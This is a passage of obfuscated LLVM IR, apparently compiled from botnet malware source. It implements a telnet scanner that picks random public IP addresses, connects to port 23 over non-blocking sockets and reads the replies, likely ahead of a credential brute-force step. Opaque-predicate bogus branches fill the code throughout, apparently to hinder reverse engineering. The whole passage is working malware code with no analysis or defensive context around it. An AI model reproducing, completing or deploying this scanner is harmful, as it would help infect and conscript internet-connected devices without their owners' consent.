  %105 = load i32, i32* %10, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 8
  %109 = load i8*, i8** %108, align 8
  call void @llvm.memset.p0i8.i64(i8* %109, i8 0, i64 1024, i32 1, i1 false)
  %110 = load i32, i32* %10, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 3
  %114 = load i8, i8* %113, align 1
  %115 = icmp ne i8 %114, 0
  br i1 %115, label %116, label %136

; <label>:116:                                    ; preds = %104
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 8
  %121 = load i8*, i8** %120, align 8
  store i8* %121, i8** %18, align 8
  %122 = load i32, i32* %10, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %123
  %125 = bitcast %struct.telstate_t* %124 to i8*
  call void @llvm.memset.p0i8.i64(i8* %125, i8 0, i64 32, i32 16, i1 false)
  %126 = load i8*, i8** %18, align 8
  %127 = load i32, i32* %10, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 8
  store i8* %126, i8** %130, align 8
  %131 = call i32 @getRandomPublicIP()
  %132 = load i32, i32* %10, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 1
  store i32 %131, i32* %135, align 4
  br label %207

; <label>:136:                                    ; preds = %104
  %137 = load i32, i32* @x.67
  %138 = load i32, i32* @y.68
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %136
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 5
  %149 = load i8, i8* %148, align 1
  %150 = add i8 %149, 1
  store i8 %150, i8* %148, align 1
  %151 = load i32, i32* %10, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 5
  %155 = load i8, i8* %154, align 1
  %156 = zext i8 %155 to i64
  %157 = icmp eq i64 %156, 14
  %158 = load i32, i32* @x.67
  %159 = load i32, i32* @y.68
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br i1 %157, label %166, label %177

; <label>:166:                                    ; preds = %originalBBpart219
  %167 = load i32, i32* %10, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 5
  store i8 0, i8* %170, align 1
  %171 = load i32, i32* %10, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 4
  %175 = load i8, i8* %174, align 2
  %176 = add i8 %175, 1
  store i8 %176, i8* %174, align 2
  br label %177

; <label>:177:                                    ; preds = %166, %originalBBpart219
  %178 = load i32, i32* %10, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 4
  %182 = load i8, i8* %181, align 2
  %183 = zext i8 %182 to i64
  %184 = icmp eq i64 %183, 7
  br i1 %184, label %185, label %206

; <label>:185:                                    ; preds = %177
  %186 = load i32, i32* @x.67
  %187 = load i32, i32* @y.68
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %185
  %194 = load i32, i32* %10, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 3
  store i8 1, i8* %197, align 1
  %198 = load i32, i32* @x.67
  %199 = load i32, i32* @y.68
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %1870

; <label>:206:                                    ; preds = %177
  br label %207

; <label>:207:                                    ; preds = %206, %116
  %208 = load i32, i32* @x.67
  %209 = load i32, i32* @y.68
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %207
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %216, align 4
  %217 = call zeroext i16 @htons(i16 zeroext 23) #13
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %217, i16* %218, align 2
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %220 = getelementptr inbounds [8 x i8], [8 x i8]* %219, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 8, i32 4, i1 false)
  %221 = load i32, i32* %10, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %227 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %226, i32 0, i32 0
  store i32 %225, i32* %227, align 4
  %228 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %229 = load i32, i32* %10, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 0
  store i32 %228, i32* %232, align 16
  %233 = load i32, i32* %10, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %234
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 16
  %238 = icmp eq i32 %237, -1
  %239 = load i32, i32* @x.67
  %240 = load i32, i32* @y.68
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %238, label %247, label %248

; <label>:247:                                    ; preds = %originalBBpart227
  br label %1870

; <label>:248:                                    ; preds = %originalBBpart227
  %249 = load i32, i32* @x.67
  %250 = load i32, i32* @y.68
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %248
  %257 = load i32, i32* %10, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %258
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 16
  %262 = load i32, i32* %10, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %263
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 16
  %267 = call i32 (i32, i32, ...) @fcntl(i32 %266, i32 3, i8* null)
  %268 = or i32 %267, 2048
  %269 = call i32 (i32, i32, ...) @fcntl(i32 %261, i32 4, i32 %268)
  %270 = load i32, i32* %10, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %276 = call i32 @connect(i32 %274, %struct.sockaddr* %275, i32 16)
  %277 = icmp eq i32 %276, -1
  %278 = load i32, i32* @x.67
  %279 = load i32, i32* @y.68
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart244, label %originalBB29alteredBB

originalBBpart244:                                ; preds = %originalBB29
  br i1 %277, label %286, label %333

; <label>:286:                                    ; preds = %originalBBpart244
  %287 = load i32, i32* @x.67
  %288 = load i32, i32* @y.68
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %286
  %295 = call i32* @__errno_location() #13
  %296 = load i32, i32* %295, align 4
  %297 = icmp ne i32 %296, 115
  %298 = load i32, i32* @x.67
  %299 = load i32, i32* @y.68
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %297, label %306, label %333

; <label>:306:                                    ; preds = %originalBBpart248
  %307 = load i32, i32* @x.67
  %308 = load i32, i32* @y.68
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %306
  %315 = load i32, i32* %10, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 16
  %320 = call i32 @sclose(i32 %319)
  %321 = load i32, i32* %10, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 3
  store i8 1, i8* %324, align 1
  %325 = load i32, i32* @x.67
  %326 = load i32, i32* @y.68
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %342

; <label>:333:                                    ; preds = %originalBBpart248, %originalBBpart244
  %334 = load i32, i32* %10, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 2
  store i8 1, i8* %337, align 8
  %338 = load i32, i32* %10, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %339
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %340, i32 0, i32 6
  store i32 0, i32* %341, align 4
  br label %342

; <label>:342:                                    ; preds = %333, %originalBBpart252
  %343 = load i32, i32* @x.67
  %344 = load i32, i32* @y.68
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %342
  %351 = load i32, i32* @x.67
  %352 = load i32, i32* @y.68
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %1869

; <label>:359:                                    ; preds = %97
  %360 = load i32, i32* %10, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 6
  %364 = load i32, i32* %363, align 4
  %365 = icmp eq i32 %364, 0
  br i1 %365, label %366, label %388

; <label>:366:                                    ; preds = %359
  %367 = load i32, i32* @x.67
  %368 = load i32, i32* @y.68
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %366
  %375 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %376 = load i32, i32* %10, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 6
  store i32 %375, i32* %379, align 4
  %380 = load i32, i32* @x.67
  %381 = load i32, i32* @y.68
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %388

; <label>:388:                                    ; preds = %originalBBpart260, %359
  br label %389

; <label>:389:                                    ; preds = %388
  %390 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %391 = getelementptr inbounds [16 x i64], [16 x i64]* %390, i64 0, i64 0
  %392 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %391) #4, !srcloc !5
  %393 = extractvalue { i64, i64* } %392, 0
  %394 = extractvalue { i64, i64* } %392, 1
  %395 = trunc i64 %393 to i32
  store i32 %395, i32* %19, align 4
  %396 = ptrtoint i64* %394 to i64
  %397 = trunc i64 %396 to i32
  store i32 %397, i32* %20, align 4
  br label %398

; <label>:398:                                    ; preds = %389
  %399 = load i32, i32* @x.67
  %400 = load i32, i32* @y.68
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %398
  %407 = load i32, i32* @x.67
  %408 = load i32, i32* @y.68
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %415

; <label>:415:                                    ; preds = %originalBBpart264
  %416 = load i32, i32* %10, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 16
  %421 = srem i32 %420, 64
  %422 = zext i32 %421 to i64
  %423 = shl i64 1, %422
  %424 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %425 = load i32, i32* %10, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 16
  %430 = sdiv i32 %429, 64
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [16 x i64], [16 x i64]* %424, i64 0, i64 %431
  %433 = load i64, i64* %432, align 8
  %434 = or i64 %433, %423
  store i64 %434, i64* %432, align 8
  %435 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %435, align 8
  %436 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %436, align 8
  %437 = load i32, i32* %10, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %438
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 16
  %442 = add nsw i32 %441, 1
  %443 = call i32 @select(i32 %442, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %443, i32* %11, align 4
  %444 = load i32, i32* %11, align 4
  %445 = icmp eq i32 %444, 1
  br i1 %445, label %446, label %519

; <label>:446:                                    ; preds = %415
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %447 = load i32, i32* %10, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %448
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 16
  %452 = bitcast i32* %15 to i8*
  %453 = call i32 @getsockopt(i32 %451, i32 1, i32 4, i8* %452, i32* %14) #4
  %454 = load i32, i32* %15, align 4
  %455 = icmp ne i32 %454, 0
  br i1 %455, label %456, label %487

; <label>:456:                                    ; preds = %446
  %457 = load i32, i32* @x.67
  %458 = load i32, i32* @y.68
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %456
  %465 = load i32, i32* %10, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 16
  %470 = call i32 @sclose(i32 %469)
  %471 = load i32, i32* %10, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 2
  store i8 0, i8* %474, align 8
  %475 = load i32, i32* %10, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 3
  store i8 1, i8* %478, align 1
  %479 = load i32, i32* @x.67
  %480 = load i32, i32* @y.68
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %518

; <label>:487:                                    ; preds = %446
  %488 = load i32, i32* %10, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %489
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 16
  %493 = load i32, i32* %10, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %494
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %495, i32 0, i32 0
  %497 = load i32, i32* %496, align 16
  %498 = call i32 (i32, i32, ...) @fcntl(i32 %497, i32 3, i8* null)
  %499 = and i32 %498, -2049
  %500 = call i32 (i32, i32, ...) @fcntl(i32 %492, i32 4, i32 %499)
  %501 = load i32, i32* %10, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 6
  store i32 0, i32* %504, align 4
  %505 = load i32, i32* %10, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %506
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %507, i32 0, i32 7
  store i16 0, i16* %508, align 16
  %509 = load i32, i32* %10, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 8
  %513 = load i8*, i8** %512, align 8
  call void @llvm.memset.p0i8.i64(i8* %513, i8 0, i64 1024, i32 1, i1 false)
  %514 = load i32, i32* %10, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 2
  store i8 2, i8* %517, align 8
  br label %1870

; <label>:518:                                    ; preds = %originalBBpart268
  br label %538

; <label>:519:                                    ; preds = %415
  %520 = load i32, i32* %11, align 4
  %521 = icmp eq i32 %520, -1
  br i1 %521, label %522, label %537

; <label>:522:                                    ; preds = %519
  %523 = load i32, i32* %10, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = call i32 @sclose(i32 %527)
  %529 = load i32, i32* %10, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 2
  store i8 0, i8* %532, align 8
  %533 = load i32, i32* %10, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 3
  store i8 1, i8* %536, align 1
  br label %537

; <label>:537:                                    ; preds = %522, %519
  br label %538

; <label>:538:                                    ; preds = %537, %518
  %539 = load i32, i32* %10, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %540
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %541, i32 0, i32 6
  %543 = load i32, i32* %542, align 4
  %544 = add i32 %543, 10
  %545 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %546 = icmp ult i32 %544, %545
  br i1 %546, label %547, label %562

; <label>:547:                                    ; preds = %538
  %548 = load i32, i32* %10, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 16
  %553 = call i32 @sclose(i32 %552)
  %554 = load i32, i32* %10, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 2
  store i8 0, i8* %557, align 8
  %558 = load i32, i32* %10, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %559
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %560, i32 0, i32 3
  store i8 1, i8* %561, align 1
  br label %562

; <label>:562:                                    ; preds = %547, %538
  br label %1869

; <label>:563:                                    ; preds = %97
  %564 = load i32, i32* @x.67
  %565 = load i32, i32* @y.68
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %563
  %572 = load i32, i32* %10, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 6
  %576 = load i32, i32* %575, align 4
  %577 = icmp eq i32 %576, 0
  %578 = load i32, i32* @x.67
  %579 = load i32, i32* @y.68
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %577, label %586, label %592

; <label>:586:                                    ; preds = %originalBBpart272
  %587 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %588 = load i32, i32* %10, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 6
  store i32 %587, i32* %591, align 4
  br label %592

; <label>:592:                                    ; preds = %586, %originalBBpart272
  %593 = load i32, i32* %10, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 16
  %598 = load i32, i32* %10, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 8
  %602 = load i8*, i8** %601, align 8
  %603 = load i32, i32* %10, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 7
  %607 = load i16, i16* %606, align 16
  %608 = zext i16 %607 to i32
  %609 = call i32 @readUntil(i32 %597, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %602, i32 1024, i32 %608)
  %610 = icmp ne i32 %609, 0
  br i1 %610, label %611, label %645

; <label>:611:                                    ; preds = %592
  %612 = load i32, i32* @x.67
  %613 = load i32, i32* @y.68
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
